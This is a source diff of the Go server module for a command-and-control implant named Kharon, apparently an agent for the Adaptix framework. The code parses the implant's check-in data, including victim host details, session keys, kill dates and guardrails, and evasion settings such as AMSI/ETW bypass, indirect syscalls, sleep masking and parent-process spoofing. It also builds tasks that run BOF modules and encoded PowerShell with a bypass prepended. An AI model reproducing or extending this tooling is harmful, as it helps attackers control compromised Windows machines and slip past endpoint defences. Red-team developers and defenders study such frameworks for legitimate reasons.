-	_ = packer.ParseBytes()
-	_ = int(packer.ParseInt32())
-	_ = int(packer.ParseInt32())
+	khcfg.evasion.syscall = uint32(packer.ParseInt32())
+	khcfg.evasion.bof_proxy = packer.ParseInt32() != 0
+	khcfg.evasion.amsi_etw_bypass = int32(packer.ParseInt32())
 
-	_ = int(packer.ParseInt32())
-	_ = int(packer.ParseInt32())
-	_ = int(packer.ParseInt32())
+	khcfg.killdate.enabled = packer.ParseInt32() != 0
+	khcfg.killdate.exit = packer.ParseInt32() != 0
+	khcfg.killdate.selfdel = packer.ParseInt32() != 0
 
-	_ = int(packer.ParseInt32())
-	_ = int(packer.ParseInt32())
-	_ = int(packer.ParseInt32())
+	day := int(packer.ParseInt16())
+	month := int(packer.ParseInt16())
+	year := int(packer.ParseInt16())
 
-	_ = packer.ParseInt16()
-	_ = packer.ParseInt16()
-	_ = packer.ParseInt16()
+	khcfg.killdate.date = time.Date(int(year), time.Month(int(month)), int(day), 0, 0, 0, 0, time.UTC)
 
-	commandLine := packer.ParseString()
-	fmt.Printf("CommandLine: %v\n", commandLine)
+	khcfg.worktime.enabled = packer.ParseInt32() != 0
+	khcfg.worktime.start = fmt.Sprintf("%02d:%02d", packer.ParseInt16(), packer.ParseInt16())
+	khcfg.worktime.end = fmt.Sprintf("%02d:%02d", packer.ParseInt16(), packer.ParseInt16())
 
-	heapHandle := packer.ParseInt32()
-	fmt.Printf("Heap Handle: %v\n", heapHandle)
+	khcfg.guardrails.ipaddress = packer.ParseString()
+	fmt.Printf("Guard IP: %s\n", khcfg.guardrails.ipaddress)
 
-	elevatedValue := packer.ParseInt32()
-	fmt.Printf("ElevatedValue: %v\n", elevatedValue)
+	khcfg.guardrails.hostname = packer.ParseString()
+	fmt.Printf("Guard Hostname: %s\n", khcfg.guardrails.hostname)
 
-	jitter := packer.ParseInt32()
-	fmt.Printf("Jitter: %v\n", jitter)
+	khcfg.guardrails.username = packer.ParseString()
+	fmt.Printf("Guard Username: %s\n", khcfg.guardrails.username)
 
-	sleep := packer.ParseInt32()
-	fmt.Printf("Sleep(ms): %v\n", sleep)
+	khcfg.guardrails.domain = packer.ParseString()
+	fmt.Printf("Guard Domain: %s\n", khcfg.guardrails.domain)
 
-	parentID := packer.ParseInt32()
-	fmt.Printf("ParentID: %v\n", parentID)
+	khcfg.session.cmd_line = packer.ParseString()
+	fmt.Printf("CommandLine: %v\n", khcfg.session.cmd_line)
 
-	procArch := packer.ParseInt32()
-	fmt.Printf("Process Arch: %v\n", procArch)
+	khcfg.session.heap_handle = uint64(packer.ParseInt64())
+	fmt.Printf("Heap Handle: %v\n", khcfg.session.heap_handle)
 
-	baseStart := packer.ParseInt64()
-	fmt.Printf("Base Start: %v\n", baseStart)
+	khcfg.session.elevated = packer.ParseInt32() != 0
+	fmt.Printf("ElevatedValue: %v\n", khcfg.session.elevated)
 
-	baseLength := packer.ParseInt32()
-	fmt.Printf("Base Length: %v\n", baseLength)
+	khcfg.session.jitter = uint32(packer.ParseInt32())
+	fmt.Printf("Jitter: %v\n", khcfg.session.jitter)
 
-	tid := packer.ParseInt32()
-	fmt.Printf("TID: %v\n", tid)
+	khcfg.session.sleep_time = uint32(packer.ParseInt32())
+	fmt.Printf("Sleep(ms): %v\n", khcfg.session.sleep_time)
 
-	// Gadgets
-	for i := 0; i < 4; i++ {
-		val := packer.ParseInt64()
-		fmt.Printf("Gadget[%d]: %v\n", i, val)
-	}
+	khcfg.session.parent_id = uint32(packer.ParseInt32())
+	fmt.Printf("ParentID: %v\n", khcfg.session.parent_id)
 
-	techniqueID := packer.ParseInt32()
-	fmt.Printf("TechniqueID: %v\n", techniqueID)
+	khcfg.session.process_arch = uint32(packer.ParseInt32())
+	fmt.Printf("Process Arch: %v\n", khcfg.session.process_arch)
 
-	parentPSID := packer.ParseInt32()
-	fmt.Printf("ParentPSID: %v\n", parentPSID)
+	khcfg.session.base.start = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("Kharon Memory Start: %v\n", khcfg.session.base.start)
 
-	pipe := packer.ParseInt32()
-	fmt.Printf("Pipe: %v\n", pipe)
+	khcfg.session.base.size = uint32(packer.ParseInt32())
+	fmt.Printf("Kharon Memory Length: %v\n", khcfg.session.base.size)
 
-	currentDir := packer.ParseString()
-	fmt.Printf("Current Dir: %v\n", currentDir)
+	startAddr, _ := strconv.ParseUint(khcfg.session.base.start, 10, 64)
+	khcfg.session.base.end = fmt.Sprintf("%v", startAddr+uint64(khcfg.session.base.size))
+	fmt.Printf("Kharon Memory End: %#x\n", khcfg.session.base.end)
 
-	blockDlls := packer.ParseInt32()
-	fmt.Printf("Block DLLs: %v\n", blockDlls)
+	khcfg.session.thread_id = uint32(packer.ParseInt32())
+	fmt.Printf("TID: %v\n", khcfg.session.thread_id)
 
-	processorName := packer.ParseString()
-	fmt.Printf("Processor Name: %v\n", processorName)
+	khcfg.ps.spawnto = string(packer.ParseBytes())
+	fmt.Printf("Spawnto: %v\n", khcfg.ps.spawnto)
 
-	ipAddress := int32ToIPv4( packer.ParseInt32() )
-	fmt.Printf("ipaddress: %s\n", ipAddress)
+	khcfg.ps.fork_pipe = string(packer.ParseBytes())
+	fmt.Printf("ForkPipeName: %v\n", khcfg.ps.fork_pipe)
 
-	totalRAM := packer.ParseInt32()
-	fmt.Printf("Total RAM: %v\n", totalRAM)
+	khcfg.mask.jmpgadget = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("JmpGadget: %v\n", khcfg.mask.jmpgadget)
 
-	avalRAM := packer.ParseInt32()
-	fmt.Printf("Available RAM: %v\n", avalRAM)
+	khcfg.mask.ntcontinue = fmt.Sprintf("%#x", uint64(packer.ParseInt64()))
+	fmt.Printf("NtContinue: %v\n", khcfg.mask.ntcontinue)
 
-	usedRAM := packer.ParseInt32()
-	fmt.Printf("Used RAM: %v\n", usedRAM)
+	khcfg.mask.heap = packer.ParseInt32() != 0
+	fmt.Printf("Mask Heap: %v\n", khcfg.mask.heap)
 
-	percentRAM := packer.ParseInt32()
-	fmt.Printf("Percent RAM: %v\n", percentRAM)
+	khcfg.mask.beacon = uint32(packer.ParseInt32())
+	fmt.Printf("Mask Beacon: %v\n", khcfg.mask.beacon)
 
-	numProcessors := packer.ParseInt32()
-	fmt.Printf("Processors Nbr: %v\n", numProcessors)
+	khcfg.machine.processor_name = string(packer.ParseBytes())
+	fmt.Printf("Processor Name: %v\n", khcfg.machine.processor_name)
+
+	khcfg.machine.ipaddress = int32ToIPv4(packer.ParseInt32())
+	fmt.Printf("ipaddress: %s\n", khcfg.machine.ipaddress)
+
+	khcfg.machine.ram_total = uint32(packer.ParseInt32())
+	fmt.Printf("Total RAM: %v\n", khcfg.machine.ram_total)
+
+	khcfg.machine.ram_aval = uint32(packer.ParseInt32())
+	fmt.Printf("Available RAM: %v\n", khcfg.machine.ram_aval)
+
+	khcfg.machine.ram_used = uint32(packer.ParseInt32())
+	fmt.Printf("Used RAM: %v\n", khcfg.machine.ram_used)
+
+	khcfg.machine.ram_perct = uint32(packer.ParseInt32())
+	fmt.Printf("Percent RAM: %v\n", khcfg.machine.ram_perct)
+
+	khcfg.machine.processor_numbers = uint32(packer.ParseInt32())
+	fmt.Printf("Processors Nbr: %v\n", khcfg.machine.processor_numbers)
+
+	khcfg.machine.os_major = uint32(packer.ParseInt32())
+	fmt.Printf("OS Major: %v\n", khcfg.machine.os_major)
+
+	khcfg.machine.os_minor = uint32(packer.ParseInt32())
+	fmt.Printf("OS Minor: %v\n", khcfg.machine.os_minor)
+
+	khcfg.machine.os_build = uint32(packer.ParseInt32())
+	fmt.Printf("OS Build: %v\n", khcfg.machine.os_build)
+
+	khcfg.machine.allocation_gran = uint32(packer.ParseInt32())
+	fmt.Printf("Allocation Granularity: %v\n", khcfg.machine.allocation_gran)
+
+	khcfg.machine.page_size = uint32(packer.ParseInt32())
+	fmt.Printf("Page Size: %v\n", khcfg.machine.page_size)
+
+	khcfg.machine.cfg_enabled = packer.ParseInt32() != 0
+	fmt.Printf("CFG Enabled: %v\n", khcfg.machine.cfg_enabled)
+
+	khcfg.machine.vbs_hvci = uint32(packer.ParseInt32())
+	fmt.Printf("VBS/HVCI Status: %v\n", khcfg.machine.vbs_hvci)
+
+	khcfg.machine.dse_status = uint32(packer.ParseInt32())
+	fmt.Printf("DSE Status: %v\n", khcfg.machine.dse_status)
 
 	key := packer.ParseBytes()
 	fmt.Printf("Session Key: %v\n", key)
 
-	username := ConvertCpToUTF8(string(usernameBytes), acp)
-	computer := ConvertCpToUTF8(string(computerBytes), acp)
-	process := ConvertCpToUTF8(string(imagePathBytes), acp)
+	process := ConvertCpToUTF8(khcfg.session.img_path, int(khcfg.session.acp))
 	if strings.Contains(process, "\\") {
 		parts := strings.Split(process, "\\")
 		process = parts[len(parts)-1]
 	}
 
-	elevated := elevatedValue > 0
-	arch := "x64"
-	if procArch != 0x64 {
-		arch = "x86"
-	}
+	khcfg.session.img_name = process
 
-	osDesc := "Windows (x64)"
-	if osArch != 0x64 {
-		osDesc = "Windows (x86)"
-	}
+	versionInfo := GetDetailedWindowsVersion(khcfg.machine.os_major, khcfg.machine.os_minor, khcfg.machine.os_build)
+    osDesc := fmt.Sprintf("%s (%s)", versionInfo["name"], versionInfo["release_name"])
 
-	agent = adaptix.AgentData{
+	agent = ax.AgentData{
 		Id:         agentId,
 		SessionKey: key,
-		OemCP:      oemcp,
-		ACP:        acp,
-		Sleep:      sleep / 1000,
-		Jitter:     jitter,
-		Username:   username,
-		Computer:   computer,
+		OemCP:      int(khcfg.session.oemcp),
+		ACP:        int(khcfg.session.acp),
+		Sleep:      uint(khcfg.session.sleep_time / 1000),
+		Jitter:     uint(khcfg.session.jitter),
+		Username:   ConvertCpToUTF8(khcfg.machine.username, int(khcfg.session.acp)),
+		Computer:   ConvertCpToUTF8(khcfg.machine.computer, int(khcfg.session.acp)),
 		Process:    process,
-		Pid:        fmt.Sprintf("%v", pid),
-		Tid:        fmt.Sprintf("%v", tid),
-		Arch:       arch,
-		Elevated:   elevated,
+		Pid:        fmt.Sprintf("%v", khcfg.session.process_id),
+		Tid:        fmt.Sprintf("%v", khcfg.session.thread_id),
+		Arch:       "x64",
+		Elevated:   khcfg.session.elevated,
 		Os:         OS_WINDOWS,
 		OsDesc:     osDesc,
-		InternalIP: ipAddress,
-		Domain:     string( domainBytes ),
+		InternalIP: khcfg.machine.ipaddress,
+		Domain:     khcfg.machine.domain,
 	}
+
+	data, err := khcfg.Marshal()
+	if err != nil {
+		fmt.Printf("ERROR: %v\n", err)
+		return agent, ModuleObject.ext, nil
+	}
+
+	agent.CustomData = data
 
 	fmt.Printf("Final Agent Struct: %+v\n", agent)
 
@@ -988,7 +1623,7 @@ func CreateAgent(initialData []byte) (adaptix.AgentData, adaptix.ExtenderAgent, 
 
 /// TASKS
 
-func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
+func PackTasks(agentData ax.AgentData, tasksArray []ax.TaskData) ([]byte, error) {
 	var packData []byte
 
 	/// START CODE HERE
@@ -1030,12 +1665,247 @@ func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
 	return data, nil
 }
 
-func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
+func FormatKharonTable(data *KharonData) string {
+	var b strings.Builder
+
+	// Configurações de coluna
+	colLabel := 25
+	colValue := 50
+
+	// ==================== HELPER FUNCTIONS ====================
+	boolStr := func(val bool) string {
+		if val {
+			return "True"
+		}
+		return "False"
+	}
+
+	// boolStrUint32 := func(val uint32) string {
+	// 	if val != 0 {
+	// 		return "True"
+	// 	}
+	// 	return "False"
+	// }
+
+	maskTechStr := func(id uint32) string {
+		switch id {
+		case 1:
+			return "Timer"
+		case 2:
+			return "Pooling"
+		case 3:
+			return "None"
+		default:
+			return fmt.Sprintf("%d", id)
+		}
+	}
+
+	syscallStr := func(sys uint32) string {
+		switch sys {
+		case 0:
+			return "None"
+		case 1:
+			return "Spoof"
+		case 2:
+			return "Spoof + Indirect"
+		default:
+			return fmt.Sprintf("%d", sys)
+		}
+	}
+
+	amsietwbpStr := func(id int32) string {
+		switch id {
+		case 0x100:
+			return "All"
+		case 0x700:
+			return "AMSI"
+		case 0x400:
+			return "ETW"
+		case 0x000:
+			return "None"
+		default:
+			return fmt.Sprintf("0x%03X", id)
+		}
+	}
+
+	dseStatusStr := func(status uint32) string {
+		switch status {
+		case 0:
+			return "Disabled"
+		case 1:
+			return "Enabled"
+		default:
+			return fmt.Sprintf("%d", status)
+		}
+	}
+
+	vbsHvciStr := func(status uint32) string {
+		switch status {
+		case 0:
+			return "Disabled"
+		case 1:
+			return "Enabled"
+		default:
+			return fmt.Sprintf("%d", status)
+		}
+	}
+
+	// ==================== FORMATTING FUNCTIONS ====================
+	row := func(label, value string) string {
+		return fmt.Sprintf("│ %-*s │ %-*s │\n", colLabel, label, colValue, value)
+	}
+
+	border := func(title string) string {
+		borderLine := "├" + strings.Repeat("─", colLabel+2) + "┼" + strings.Repeat("─", colValue+2) + "┤"
+		if title == "top" {
+			return "┌" + strings.Repeat("─", colLabel+2) + "┬" + strings.Repeat("─", colValue+2) + "┐\n"
+		} else if title == "bottom" {
+			return "└" + strings.Repeat("─", colLabel+2) + "┴" + strings.Repeat("─", colValue+2) + "┘\n"
+		}
+		return borderLine + "\n"
+	}
+
+	sectionTitle := func(title string) string {
+		padding := (colLabel + colValue + 6 - len(title)) / 2
+		return fmt.Sprintf("│ %s%s%s │\n",
+			strings.Repeat(" ", padding),
+			title,
+			strings.Repeat(" ", padding))
+	}
+
+	// Top border
+	b.WriteString(border("top"))
+
+	// ==================== SESSION ====================
+	b.WriteString(sectionTitle("SESSION INFORMATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Agent ID", data.session.agent_id_str[:min(8, len(data.session.agent_id_str))]))
+	b.WriteString(row("Image Name", data.session.img_name))
+	b.WriteString(row("Image Path", data.session.img_path))
+	b.WriteString(row("Command Line", data.session.cmd_line))
+	b.WriteString(row("Process ID", fmt.Sprintf("%d", data.session.process_id)))
+	b.WriteString(row("Thread ID", fmt.Sprintf("%d", data.session.thread_id)))
+	b.WriteString(row("Parent ID", fmt.Sprintf("%d", data.session.parent_id)))
+	b.WriteString(row("Elevated", boolStr(data.session.elevated)))
+	b.WriteString(row("Process Arch", fmt.Sprintf("0x%02X", data.session.process_arch)))
+	b.WriteString(row("Heap Handle", fmt.Sprintf("0x%016X", data.session.heap_handle)))
+	b.WriteString(row("Kharon in-memory base", data.session.base.start))
+	b.WriteString(row("Kharon in-memory Size", fmt.Sprintf("%d bytes", data.session.base.size)))
+	b.WriteString(row("Code Page (ACP)", fmt.Sprintf("%d", data.session.acp)))
+	b.WriteString(row("OEM Code Page", fmt.Sprintf("%d", data.session.oemcp)))
+	b.WriteString(border("middle"))
+
+	// ==================== TIMING ====================
+	b.WriteString(sectionTitle("TIMING CONFIGURATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Sleep Time", fmt.Sprintf("%d ms", data.session.sleep_time)))
+	b.WriteString(row("Jitter", fmt.Sprintf("%d%%", data.session.jitter)))
+	b.WriteString(border("middle"))
+
+	// ==================== EVASION ====================
+	b.WriteString(sectionTitle("EVASION TECHNIQUES"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Mask Beacon", maskTechStr(data.mask.beacon)))
+	b.WriteString(row("Heap Mask", boolStr(data.mask.heap)))
+	b.WriteString(row("Jump Gadget", data.mask.jmpgadget))
+	b.WriteString(row("NtContinue Gadget", data.mask.ntcontinue))
+	b.WriteString(row("BOF API Proxy", boolStr(data.evasion.bof_proxy)))
+	b.WriteString(row("Syscall Method", syscallStr(data.evasion.syscall)))
+	b.WriteString(row("AMSI/ETW Bypass", amsietwbpStr(data.evasion.amsi_etw_bypass)))
+	b.WriteString(border("middle"))
+
+	// ==================== PROCESS SPAWNING ====================
+	b.WriteString(sectionTitle("PROCESS SPAWNING"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Parent PID", fmt.Sprintf("%d", data.ps.parent_id)))
+	b.WriteString(row("Block DLLs", boolStr(data.ps.block_dlls)))
+	b.WriteString(row("Spawn To", data.ps.spawnto))
+	b.WriteString(row("Fork Pipe", data.ps.fork_pipe))
+	b.WriteString(border("middle"))
+
+	// ==================== KILLDATE ====================
+	b.WriteString(sectionTitle("KILLDATE CONFIGURATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Use Killdate", boolStr(data.killdate.enabled)))
+	b.WriteString(row("Exit Type", func() string {
+		if data.killdate.exit {
+			return "Exit Process"
+		}
+		return "Exit Thread"
+	}()))
+	b.WriteString(row("Self Delete", boolStr(data.killdate.selfdel)))
+	b.WriteString(row("Killdate", data.killdate.date.Format("02/01/2006")))
+	b.WriteString(border("middle"))
+
+	// ==================== WORKTIME ====================
+	b.WriteString(sectionTitle("WORKTIME CONFIGURATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Enable Worktime", boolStr(data.worktime.enabled)))
+	b.WriteString(row("Start Time", data.worktime.start))
+	b.WriteString(row("End Time", data.worktime.end))
+	b.WriteString(border("middle"))
+
+	// ==================== GUARDRAILS ====================
+	b.WriteString(sectionTitle("GUARDRAILS"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("IP Address", data.guardrails.ipaddress))
+	b.WriteString(row("Hostname", data.guardrails.hostname))
+	b.WriteString(row("Username", data.guardrails.username))
+	b.WriteString(row("Domain", data.guardrails.domain))
+	b.WriteString(border("middle"))
+
+	// ==================== SYSTEM INFORMATION ====================
+	b.WriteString(sectionTitle("SYSTEM INFORMATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Username", data.machine.username))
+	b.WriteString(row("Computer Name", data.machine.computer))
+	b.WriteString(row("NetBIOS Name", data.machine.netbios))
+	b.WriteString(row("Domain", data.machine.domain))
+	b.WriteString(row("IP Address", data.machine.ipaddress))
+	b.WriteString(row("OS Architecture", fmt.Sprintf("0x%02X", data.machine.os_arch)))
+	b.WriteString(row("OS Version", fmt.Sprintf("%d.%d.%d",
+		data.machine.os_major,
+		data.machine.os_minor,
+		data.machine.os_build)))
+	b.WriteString(row("Processor Name", data.machine.processor_name))
+	b.WriteString(row("Processor Count", fmt.Sprintf("%d", data.machine.processor_numbers)))
+	b.WriteString(border("middle"))
+
+	// ==================== MEMORY INFORMATION ====================
+	b.WriteString(sectionTitle("MEMORY INFORMATION"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("Total RAM", fmt.Sprintf("%d MB", data.machine.ram_total)))
+	b.WriteString(row("Available RAM", fmt.Sprintf("%d MB", data.machine.ram_aval)))
+	b.WriteString(row("Used RAM", fmt.Sprintf("%d MB", data.machine.ram_used)))
+	b.WriteString(row("RAM Usage", fmt.Sprintf("%d%%", data.machine.ram_perct)))
+	b.WriteString(row("Page Size", fmt.Sprintf("%d bytes", data.machine.page_size)))
+	b.WriteString(row("Allocation Granularity", fmt.Sprintf("%d bytes", data.machine.allocation_gran)))
+	b.WriteString(border("middle"))
+
+	// ==================== SECURITY FEATURES ====================
+	b.WriteString(sectionTitle("SECURITY FEATURES"))
+	b.WriteString(border("middle"))
+	b.WriteString(row("CFG Enabled", boolStr(data.machine.cfg_enabled)))
+	b.WriteString(row("DSE Status", dseStatusStr(data.machine.dse_status)))
+	b.WriteString(row("VBS/HVCI", vbsHvciStr(data.machine.vbs_hvci)))
+	b.WriteString(border("bottom"))
+
+	return b.String()
+}
+
+func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
 	var (
-		taskData    adaptix.TaskData
-		messageData adaptix.ConsoleMessageData
+		taskData    ax.TaskData
+		messageData ax.ConsoleMessageData
+		kharon_cfg  KharonData
 		err         error
 	)
+
+	err = kharon_cfg.Unmarshal(agent.CustomData)
+	if err != nil {
+		fmt.Printf("ERROR: %v\n", err)
+		return taskData, messageData, errors.New("'Error reading agent configuration data")
+	}
 
 	command, ok := args["command"].(string)
 	if !ok {
@@ -1043,12 +1913,12 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 	}
 	subcommand, _ := args["subcommand"].(string)
 
-	taskData = adaptix.TaskData{
+	taskData = ax.TaskData{
 		Type: TYPE_TASK,
 		Sync: true,
 	}
 
-	messageData = adaptix.ConsoleMessageData{
+	messageData = ax.ConsoleMessageData{
 		Status: MESSAGE_INFO,
 		Text:   "",
 	}
@@ -1060,7 +1930,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 
 	switch command {
 
-	case "ps":
+	case "process":
 
 		switch subcommand {
 
@@ -1095,7 +1965,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			var scriptStr string
 
 			bypass, bypassOk := args["bypass"].(string)
-			
+
 			exePath, err := os.Executable()
 			if err != nil {
 				err = fmt.Errorf("failed to get executable path: %v", err)
@@ -1109,10 +1979,10 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 
 			bypassBasePath := filepath.Join(exeDir, "extenders", "agent_kharon", "src_modules", "PwshBypass", "Bin", "amsi_etw_bypass.")
 			fmt.Printf("[DEBUG] Bypass base path: %s\n", bypassBasePath)
-			
+
 			var bypassFile string
 			var bypassContent []byte
-			
+
 			if bypassOk && bypass != "" {
 				fmt.Printf("[DEBUG] Bypass option specified: %s\n", bypass)
 				switch bypass {
@@ -1127,7 +1997,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 					fmt.Printf("[ERROR] %v\n", err)
 					goto RET
 				}
-				
+
 				fmt.Printf("[DEBUG] Loading bypass file: %s\n", bypassFile)
 				bypassContent, err = os.ReadFile(bypassFile)
 				if err != nil {
@@ -1135,14 +2005,14 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 					fmt.Printf("[ERROR] %v\n", err)
 					goto RET
 				}
-				
+
 				fmt.Printf("[DEBUG] Bypass file loaded successfully (%d bytes)\n", len(bypassContent))
 			} else {
 				fmt.Printf("[DEBUG] No bypass option specified\n")
 			}
-			
+
 			var finalScript strings.Builder
-			
+
 			if scriptOk && script != "" {
 				fmt.Printf("[DEBUG] Script parameter provided (encoded: %t)\n", len(script) > 0)
 				if decoded, err := base64.StdEncoding.DecodeString(script); err == nil {
@@ -1157,13 +2027,13 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			} else {
 				fmt.Printf("[DEBUG] No script parameter provided\n")
 			}
-			
+
 			fmt.Printf("[DEBUG] Command to execute: %s\n", command)
 			finalScript.WriteString(command)
-			
+
 			finalScriptStr := finalScript.String()
 			fmt.Printf("[DEBUG] Final script size: %d bytes\n", len(finalScriptStr))
-			
+
 			encodeForPowerShell := func(s string) string {
 				utf16Bytes := utf16.Encode([]rune(s))
 				byteSlice := make([]byte, len(utf16Bytes)*2)
@@ -1175,7 +2045,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				fmt.Printf("[DEBUG] Encoded command size: %d bytes\n", len(encoded))
 				return encoded
 			}
-			
+
 			encodedCmd := encodeForPowerShell(finalScriptStr)
 			fullCmd = fmt.Sprintf("powershell.exe -EncodedCommand %s", encodedCmd)
 			fmt.Printf("[DEBUG] Full command prepared: powershell.exe -EncodedCommand <...>\n")
@@ -1197,7 +2067,17 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_CAT, ConvertUTF8toCp(path, agent.ACP)}
+
+			bofData, err := LoadExtModule("cat", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "cd":
 			path, ok := args["path"].(string)
@@ -1205,7 +2085,23 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_CD, ConvertUTF8toCp(path, agent.ACP)}
+
+			bofData, err := LoadExtModule("cd", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			fmt.Printf("[DEBUG] Changing directory to: %s\n", path)
+			fmt.Printf("[DEBUG] bof file: size %d", bofData)
+
+			hex.Dump(bofData)
+
+			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			if err != nil {
+				goto RET
+			}
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "cp":
 			src, ok := args["src"].(string)
@@ -1218,7 +2114,20 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'dst' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_COPY, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
+
+			bofData, err := LoadExtModule("cp", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(
+				ConvertUTF8toCp(src, agent.ACP),
+				ConvertUTF8toCp(dst, agent.ACP),
+			)
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "ls":
 			dir, ok := args["directory"].(string)
@@ -1232,7 +2141,16 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				dir += "\\*"
 			}
 
-			array = []interface{}{TASK_FS, FS_LS, ConvertUTF8toCp(dir, agent.ACP)}
+			bofData, err := LoadExtModule("ls", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(ConvertUTF8toCp(dir, agent.ACP))
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "mv":
 			src, ok := args["src"].(string)
@@ -1245,7 +2163,20 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'dst' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_MOVE, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
+
+			bofData, err := LoadExtModule("mv", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(
+				ConvertUTF8toCp(src, agent.ACP),
+				ConvertUTF8toCp(dst, agent.ACP),
+			)
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "mkdir":
 			path, ok := args["path"].(string)
@@ -1253,10 +2184,31 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_MKDIR, ConvertUTF8toCp(path, agent.ACP)}
+
+			bofData, err := LoadExtModule("mkdir", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "pwd":
-			array = []interface{}{TASK_FS, FS_PWD}
+			bofData, err := LoadExtModule("pwd", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			fmt.Printf("bof file content size: %d\n", bofData)
+
+			bofParam, err := BofPackData()
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		case "rm":
 			path, ok := args["path"].(string)
@@ -1264,32 +2216,47 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'path' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_FS, FS_RM, ConvertUTF8toCp(path, agent.ACP)}
+
+			bofData, err := LoadExtModule("rm", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			if err != nil {
+				goto RET
+			}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 		default:
-			err = errors.New("subcommand for 'fs': 'cat', 'cd', 'cp', 'ls', 'mv', 'mkdir', 'pwd', 'ls' ")
+			err = errors.New("subcommand for 'fs': 'cat', 'cd', 'cp', 'ls', 'mv', 'mkdir', 'pwd', 'rm'")
 			goto RET
 		}
 
 	case "exit":
-
-		if subcommand == "thread" {
+		switch subcommand {
+		case "thread":
 			array = []interface{}{TASK_EXIT, EXIT_THREAD}
-		} else if subcommand == "process" {
+		case "process":
 			array = []interface{}{TASK_EXIT, EXIT_PROCESS}
-		} else {
+		default:
 			err = errors.New("subcommand must be 'thread' or 'process'")
 			goto RET
 		}
-		break
 
 	case "info":
-		array = []interface{}{TASK_GETINFO}
+		console_out := FormatKharonTable(&kharon_cfg)
+
+		taskData.Type = ax.TASK_TYPE_LOCAL
+
+		taskData.Message   = "Kharon config informations:"
+		taskData.Completed = true
+		taskData.ClearText = console_out
+
+		// ts.TsAgentConsoleOutput(agent.Id, MESSAGE_SUCCESS, "Kharon config informations:\n\n", fmt.Sprintf("\n\n%s", console_out), false)
 
 	case "socks":
 		taskData.Type = TYPE_TUNNEL
-
-		fmt.Printf("Breakpoint 1\n")
